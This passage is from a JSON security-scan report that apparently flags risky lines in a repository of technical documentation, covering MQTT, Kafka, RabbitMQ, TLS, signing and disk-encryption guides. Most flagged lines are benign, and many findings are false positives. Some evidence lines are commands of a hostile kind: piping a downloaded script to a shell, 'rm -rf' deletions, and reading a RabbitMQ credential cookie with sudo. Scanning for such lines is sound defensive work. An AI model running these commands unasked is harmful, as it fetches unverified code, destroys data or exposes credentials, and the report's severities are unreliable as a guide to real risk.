      "line_number": 3852,
      "issue": "Path traversal pattern",
      "evidence": "import { CartPage } from '../pages/CartPage';",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
      "line_number": 3853,
      "issue": "Path traversal pattern",
      "evidence": "import { CheckoutPage } from '../pages/CheckoutPage';",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
      "line_number": 3898,
      "issue": "Path traversal pattern",
      "evidence": "import { test as authTest } from '../fixtures/auth';",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/realtime/websocket-implementation.md",
      "line_number": 456,
      "issue": "Unencrypted HTTP",
      "evidence": "const url = new URL(req.url!, `http://${req.headers.host}`);",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/realtime/websocket-implementation/resources/REFERENCE.md",
      "line_number": 1168,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://websocket_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/zig/zig-build-system.md",
      "line_number": 56,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf zig-out zig-cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/caching/cdn-edge-caching.md",
      "line_number": 632,
      "issue": "Unencrypted HTTP",
      "evidence": "for url_element in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}loc'):",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/protocols/websocket-protocols.md",
      "line_number": 281,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://websocket_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/websocket-protocols.md",
      "line_number": 610,
      "issue": "Path traversal pattern",
      "evidence": "cd ../examples/docker",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/mqtt-messaging.md",
      "line_number": 440,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get install mosquitto mosquitto-clients",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/mqtt-messaging.md",
      "line_number": 829,
      "issue": "Path traversal pattern",
      "evidence": "./validate_mqtt_config.py --config ../examples/mosquitto/mosquitto.conf --json",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/mqtt-messaging.md",
      "line_number": 839,
      "issue": "Path traversal pattern",
      "evidence": "cd ../examples",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/mqtt-messaging.md",
      "line_number": 860,
      "issue": "Path traversal pattern",
      "evidence": "cd ../scripts",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/kafka-streams.md",
      "line_number": 859,
      "issue": "Path traversal pattern",
      "evidence": "cd ../examples/docker",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/kafka-streams.md",
      "line_number": 870,
      "issue": "Path traversal pattern",
      "evidence": "cd ../examples/python",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/protobuf-schemas.md",
      "line_number": 739,
      "issue": "Path traversal pattern",
      "evidence": "./validate_proto_schemas.py --proto-file ../examples/user_service.proto --json",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/protobuf-schemas.md",
      "line_number": 744,
      "issue": "Path traversal pattern",
      "evidence": "./generate_proto_code.py --proto-file ../examples/user_service.proto --languages python,go --output-dir ./gen",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/protobuf-schemas.md",
      "line_number": 749,
      "issue": "Path traversal pattern",
      "evidence": "./analyze_schema_compatibility.py --old ../examples/schema_evolution/v1.proto --new ../examples/schema_evolution/v2.proto",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/grpc-implementation.md",
      "line_number": 813,
      "issue": "Path traversal pattern",
      "evidence": "./validate_proto.py --proto-file ../examples/protos/service.proto --json",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/grpc-implementation.md",
      "line_number": 818,
      "issue": "Path traversal pattern",
      "evidence": "./generate_client.py --proto-file ../examples/protos/service.proto --language python --output-dir ./client",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/grpc-implementation.md",
      "line_number": 823,
      "issue": "Path traversal pattern",
      "evidence": "cd ../examples",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/grpc-implementation.md",
      "line_number": 844,
      "issue": "Path traversal pattern",
      "evidence": "./test_grpc_server.sh --server localhost:50051 --proto-file ../examples/protos/service.proto --json",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/protocols/kafka-streams/resources/REFERENCE.md",
      "line_number": 1949,
      "issue": "Possible hardcoded password",
      "evidence": "password=\"admin-secret\"  # Example only - use secure credential management",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/protocols/kafka-streams/resources/REFERENCE.md",
      "line_number": 1962,
      "issue": "Possible hardcoded password",
      "evidence": "sasl_plain_password='alice-secret'  # Example only - use environment variable or secret manager",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/protocols/kafka-streams/resources/REFERENCE.md",
      "line_number": 1974,
      "issue": "Possible hardcoded password",
      "evidence": "sasl_plain_password='alice-secret'  # Example only - use environment variable or secret manager",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/protocols/kafka-streams/resources/examples/README.md",
      "line_number": 128,
      "issue": "Unencrypted HTTP",
      "evidence": "docker-compose exec ksqldb-cli ksql http://ksqldb-server:8088",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/protocols/kafka-streams/resources/examples/README.md",
      "line_number": 400,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /tmp/kafka-logs /tmp/zookeeper",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
      "line_number": 1461,
      "issue": "Unencrypted HTTP",
      "evidence": "auth.http.auth_req.url = http://auth-service/mqtt/auth",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
      "line_number": 1546,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get update",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
      "line_number": 1547,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get install mosquitto mosquitto-clients",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
      "line_number": 2280,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://mqtt;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
      "line_number": 3075,
      "issue": "Unencrypted HTTP",
      "evidence": "prometheus.push.gateway.server = http://pushgateway:9091",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1586,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl start rabbitmq-server",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1589,
      "issue": "Privilege escalation",
      "evidence": "sudo cat /var/lib/rabbitmq/.erlang.cookie",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1595,
      "issue": "Privilege escalation",
      "evidence": "echo \"COOKIEVALUE\" | sudo tee /var/lib/rabbitmq/.erlang.cookie",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1596,
      "issue": "Privilege escalation",
      "evidence": "sudo chmod 400 /var/lib/rabbitmq/.erlang.cookie",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1597,
      "issue": "Privilege escalation",
      "evidence": "sudo chown rabbitmq:rabbitmq /var/lib/rabbitmq/.erlang.cookie",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1600,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl start rabbitmq-server",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1603,
      "issue": "Privilege escalation",
      "evidence": "sudo rabbitmqctl stop_app",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1604,
      "issue": "Privilege escalation",
      "evidence": "sudo rabbitmqctl reset",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1605,
      "issue": "Privilege escalation",
      "evidence": "sudo rabbitmqctl join_cluster rabbit@ubuntu1",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1606,
      "issue": "Privilege escalation",
      "evidence": "sudo rabbitmqctl start_app",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1612,
      "issue": "Privilege escalation",
      "evidence": "sudo rabbitmqctl stop_app",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1613,
      "issue": "Privilege escalation",
      "evidence": "sudo rabbitmqctl reset",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1614,
      "issue": "Privilege escalation",
      "evidence": "sudo rabbitmqctl join_cluster rabbit@ubuntu1",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1615,
      "issue": "Privilege escalation",
      "evidence": "sudo rabbitmqctl start_app",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 1620,
      "issue": "Privilege escalation",
      "evidence": "sudo rabbitmqctl cluster_status",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 3112,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl status rabbitmq-server",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 3115,
      "issue": "Privilege escalation",
      "evidence": "sudo netstat -tlnp | grep 5672",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 3124,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl start rabbitmq-server",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
      "line_number": 3127,
      "issue": "Privilege escalation",
      "evidence": "sudo ufw allow 5672/tcp",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/sni-routing.md",
      "line_number": 69,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i any -A 'tcp port 443' | grep -i \"server_name\"",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/sni-routing.md",
      "line_number": 89,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend1;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/sni-routing.md",
      "line_number": 102,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend2;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/sni-routing.md",
      "line_number": 115,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend3;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/sni-routing.md",
      "line_number": 138,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://$backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/sni-routing.md",
      "line_number": 288,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://$subdomain-backend:8080;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 111,
      "issue": "Unencrypted HTTP",
      "evidence": "<Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\">",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 114,
      "issue": "Unencrypted HTTP",
      "evidence": "<SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/>",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 116,
      "issue": "Unencrypted HTTP",
      "evidence": "<DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/>",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 163,
      "issue": "Force flag usage",
      "evidence": "--force \\",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 191,
      "issue": "Unencrypted HTTP",
      "evidence": "/tr http://timestamp.digicert.com /td SHA256 \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 242,
      "issue": "Privilege escalation",
      "evidence": "sudo mv cosign-linux-amd64 /usr/local/bin/cosign",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 327,
      "issue": "Unencrypted HTTP",
      "evidence": "http://timestamp.digicert.com > response.tsr",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 335,
      "issue": "Unencrypted HTTP",
      "evidence": "- DigiCert: `http://timestamp.digicert.com`",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 336,
      "issue": "Unencrypted HTTP",
      "evidence": "- Sectigo: `http://timestamp.sectigo.com`",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 443,
      "issue": "Unencrypted HTTP",
      "evidence": "wget http://crl.example.com/revoked.crl",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 454,
      "issue": "Unencrypted HTTP",
      "evidence": "-url http://ocsp.example.com \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 565,
      "issue": "Unencrypted HTTP",
      "evidence": "signtool sign /tr http://timestamp.digicert.com /td SHA256 app.exe",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 613,
      "issue": "Unencrypted HTTP",
      "evidence": "openssl ocsp -issuer ca.pem -cert cert.pem -url http://ocsp.example.com",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 781,
      "issue": "Path traversal pattern",
      "evidence": "cd ../examples/python",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 788,
      "issue": "Path traversal pattern",
      "evidence": "cd ../",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification.md",
      "line_number": 838,
      "issue": "Unencrypted HTTP",
      "evidence": "signtool sign /f cert.pfx /p password /tr http://timestamp.digicert.com /td SHA256 app.exe",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest.md",
      "line_number": 265,
      "issue": "Privilege escalation",
      "evidence": "sudo fdesetup enable",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/encryption-at-rest.md",
      "line_number": 621,
      "issue": "Path traversal pattern",
      "evidence": "cd ../examples/python",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/encryption-at-rest.md",
      "line_number": 628,
      "issue": "Path traversal pattern",
      "evidence": "cd ../",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/tls-configuration.md",
      "line_number": 129,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/tls-configuration.md",
      "line_number": 319,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 65,
      "issue": "Privilege escalation",
      "evidence": "sudo apt install certbot python3-certbot-nginx",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 74,
      "issue": "Privilege escalation",
      "evidence": "sudo certbot certonly --webroot \\",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 87,
      "issue": "Privilege escalation",
      "evidence": "sudo certbot --nginx -d example.com -d www.example.com",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 99,
      "issue": "Privilege escalation",
      "evidence": "sudo certbot certonly --manual \\",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 111,
      "issue": "Privilege escalation",
      "evidence": "sudo certbot renew --dry-run",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 135,
      "issue": "Pipe curl to shell",
      "evidence": "curl https://get.acme.sh | sh",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 141,
      "issue": "Possible hardcoded token",
      "evidence": "export CF_Token=\"your-cloudflare-api-token\"  # Placeholder - replace with actual API token from Cloudflare dashboard",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 186,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl enable --now certbot-renew.timer",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 187,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl list-timers certbot-renew.timer",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 748,
      "issue": "Path traversal pattern",
      "evidence": "cd ../examples/python",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/certificate-management.md",
      "line_number": 755,
      "issue": "Path traversal pattern",
      "evidence": "cd ../",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals.md",
      "line_number": 243,
      "issue": "Unencrypted HTTP",
      "evidence": "-url http://ocsp.example.com -CAfile ca-cert.pem",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 411,
      "issue": "Possible hardcoded password",
      "evidence": "password = \"user-password\"  # Example only - in production, get from secure input",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1062,
      "issue": "Privilege escalation",
      "evidence": "sudo cryptsetup luksFormat /dev/sdb1",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1065,
      "issue": "Privilege escalation",
      "evidence": "sudo cryptsetup luksOpen /dev/sdb1 encrypted_disk",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1068,
      "issue": "Privilege escalation",
      "evidence": "sudo mkfs.ext4 /dev/mapper/encrypted_disk",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1071,
      "issue": "Privilege escalation",
      "evidence": "sudo mount /dev/mapper/encrypted_disk /mnt/encrypted",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1074,
      "issue": "Privilege escalation",
      "evidence": "echo \"encrypted_disk /dev/sdb1 none luks\" | sudo tee -a /etc/crypttab",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1077,
      "issue": "Privilege escalation",
      "evidence": "echo \"/dev/mapper/encrypted_disk /mnt/encrypted ext4 defaults 0 2\" | sudo tee -a /etc/fstab",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1083,
      "issue": "Privilege escalation",
      "evidence": "sudo cryptsetup luksAddKey /dev/sdb1",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1086,
      "issue": "Privilege escalation",
      "evidence": "sudo cryptsetup luksRemoveKey /dev/sdb1",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1089,
      "issue": "Privilege escalation",
      "evidence": "sudo cryptsetup luksHeaderBackup /dev/sdb1 --header-backup-file luks-header-backup",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1092,
      "issue": "Privilege escalation",
      "evidence": "sudo cryptsetup luksHeaderRestore /dev/sdb1 --header-backup-file luks-header-backup",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1102,
      "issue": "Privilege escalation",
      "evidence": "sudo cryptsetup luksAddKey /dev/sdb1 /root/keyfile",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1105,
      "issue": "Privilege escalation",
      "evidence": "sudo cryptsetup luksOpen /dev/sdb1 encrypted_disk --key-file /root/keyfile",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1117,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get install ecryptfs-utils",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1121,
      "issue": "Privilege escalation",
      "evidence": "sudo mount -t ecryptfs ~/Private ~/Private",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1180,
      "issue": "Privilege escalation",
      "evidence": "sudo fdesetup enable",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
